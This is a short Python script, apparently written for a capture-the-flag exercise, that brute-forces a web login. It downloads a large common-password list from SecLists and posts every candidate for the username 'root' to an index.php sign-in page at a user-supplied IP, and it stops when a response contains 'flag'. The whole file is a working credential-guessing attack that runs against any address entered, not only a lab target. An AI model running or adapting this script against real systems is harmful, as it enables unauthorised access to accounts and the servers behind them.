import requests

password_list_url = "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt"
username = "root"

def get_password_list(url):
	response = requests.get(url)
	return response.text.splitlines()

def bruteforce():
	ip = input("Please enter the IP: ")
	
	try:
		response = requests.get(f"http://{ip}", timeout=3)
		response.raise_for_status()
	except requests.exceptions.RequestException as e:
		print("Connection failed. Bad IP or network issue!")
		return False

	password_list = get_password_list(password_list_url)
	for password in password_list:
		password = password.strip()
		
		response = requests.post(f"http://{ip}/index.php?page=signin&username={username}&password={password}&Login=Login#")
		
		if "flag" in response.text:
			print(f"Success! Username: {username} Password: {password}")
			return True
		else:
			print(f"Failed attempt with password: {password}")
	
	print("Password not found in the list.")
	return False

bruteforce()